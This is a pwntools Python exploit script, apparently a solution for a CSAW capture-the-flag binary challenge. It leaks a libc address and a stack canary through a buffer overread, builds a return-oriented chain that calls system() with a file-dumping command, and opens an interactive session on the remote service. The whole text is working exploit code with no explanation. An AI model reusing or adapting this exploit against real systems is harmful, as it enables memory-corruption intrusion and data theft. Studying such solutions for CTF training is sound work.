from pwn import *
import sys

if len(sys.argv) > 1:
    host = "localhost"
    port = int(sys.argv[1])
else:
    host = "pwn.chal.csaw.io"
    port = 8002

context(log_level='info', arch='amd64', os='linux')

libc = ELF("libc-2.19.so")
proc_open_in_libc = libc.symbols["_IO_proc_open"]
system_in_libc = libc.symbols["system"]
system_offset = system_in_libc - proc_open_in_libc

r = remote(host, port)

r.recvuntil(">")
r.sendline("1")
r.recvuntil(":")
reference = r.recvuntil("\n")[2:]
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")
r.send("A" * 312)
buf = r.recv(324)
r.recvuntil(">")
r.sendline("2")
r.recvuntil(">")

proc_open_addr = int(reference, 16)
stack_base = 0x7ffe # guess the first 32 bits of stack address
canary = buf[-12:-4]
rbp = u32(buf[-4:])
buf_addr = rbp - 0x30 - 0x140
log.info("canary = %s", canary.encode('hex'))
log.info("buf = %x", buf_addr)

payload = "od *>&4\0"
payload += 'A' * (312-len(payload))
payload += canary
payload += 'D' * 8
payload += p64(proc_open_addr + 0x1e7) # pop rdi; ret
payload += p32(buf_addr)
payload += p32(stack_base)
payload += p64(proc_open_addr + system_offset)

r.send(payload)
r.interactive()